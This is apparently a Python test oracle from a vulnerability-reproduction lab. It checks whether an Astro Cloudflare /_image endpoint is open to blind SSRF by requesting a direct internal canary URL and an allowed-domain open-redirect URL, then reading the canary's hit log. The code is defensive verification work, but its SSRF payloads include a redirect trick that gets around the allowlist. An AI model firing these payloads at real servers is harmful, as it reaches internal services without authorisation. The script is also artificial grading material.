#!/usr/bin/env python3
"""
Benign SSRF canary oracle for astro-cloudflare-cve-2026-41321.

Fires two EXTERNAL HTTP requests at the REAL running Astro server's built-in
/_image endpoint (the @astrojs/cloudflare image-transform endpoint) and detects
whether the internal, non-allowlisted `canary` sidecar was reached (blind SSRF).
Detection is via the shared `hits` volume, into which the canary appends
${PCB_FLAG} for every request it receives.

  * ORIGINAL payload (CVE-2025-58179 form): a DIRECT internal href
        http://canary/orig-<profile>
    - reaches the canary only where the /_image endpoint fetches without an
      allowlist check (v0). Blocked (403) once isRemoteAllowed() exists (v1/v2).

  * RESIDUAL payload (CVE-2026-41321 form): an ALLOWED-domain open redirect
        http://allowed/redirect?to=http://canary/resid-<profile>
    - isRemoteAllowed("http://allowed/...") == true, so the guard passes; the
      residual is whether the server FOLLOWS the 302 to the internal canary.
      Followed on v1 (redirect:'follow'); blocked on v2 (redirect:'manual').

Usage:
    PCB_FLAG=<token> python3 oracle.py --profile v1 --base-url http://127.0.0.1:4311
Exit 0 prints a JSON verdict.
"""
import argparse
import json
import os
import subprocess
import sys
import time
import urllib.parse
import urllib.request

FLAG = os.environ.get("PCB_FLAG", "PCB_FLAG_UNSET")
COMPOSE_PROJECT = "pcb-astro-cf-41321"


def canary_log():
    """Read the canary hit log out of the shared volume via docker compose exec."""
    try:
        out = subprocess.run(
            ["docker", "compose", "exec", "-T", "canary", "cat", "/hits/hits.log"],
            cwd=os.path.dirname(os.path.abspath(__file__)),
            capture_output=True, text=True, timeout=30,
        )
        return out.stdout or ""
    except Exception as e:  # noqa
        return f"__ERR__ {e}"


def canary_reached(marker):
    log = canary_log()
    return (FLAG in log) and (f"path=/{marker}" in log)


def http_get(url, timeout=30):
    req = urllib.request.Request(url, method="GET")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()
    except Exception as e:  # noqa
        return None, str(e).encode()


def img(base, href):
    q = urllib.parse.quote(href, safe="")
    return f"{base}/_image?href={q}&w=64&f=webp"


def wait_ready(base):
    for _ in range(40):
        code, _ = http_get(base + "/", timeout=5)
        if code == 200:
            return True
        time.sleep(3)
    return False


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--profile", required=True, choices=["v0", "v1", "v2"])
    ap.add_argument("--base-url", required=True)
    ap.add_argument("--wait", action="store_true")
    a = ap.parse_args()
    base = a.base_url.rstrip("/")
    p = a.profile

    if a.wait and not wait_ready(base):
        print(json.dumps({"error": "server not ready", "base": base}))
        sys.exit(2)

    orig_marker = f"orig-{p}"
    resid_marker = f"resid-{p}"

    # ORIGINAL: direct internal href (not on the allowlist).
    orig_code, _ = http_get(img(base, f"http://canary/{orig_marker}"))
    time.sleep(1.0)
    orig_hit = canary_reached(orig_marker)

    # RESIDUAL: allowed-domain open redirect -> internal canary.
    resid_code, _ = http_get(
        img(base, f"http://allowed/redirect?to=http://canary/{resid_marker}")
    )
    time.sleep(1.0)
    resid_hit = canary_reached(resid_marker)

    # LEGIT control: allowed-domain image must succeed and NOT hit the canary.
    legit_code, _ = http_get(img(base, "http://allowed/img.png"))

    verdict = {
        "profile": p,
        "flag": FLAG,
        "original_payload_http": orig_code,
        "original_reaches_canary": orig_hit,
        "residual_payload_http": resid_code,
        "residual_reaches_canary": resid_hit,
        "legit_http": legit_code,
    }
    print(json.dumps(verdict, indent=2))


if __name__ == "__main__":
    main()
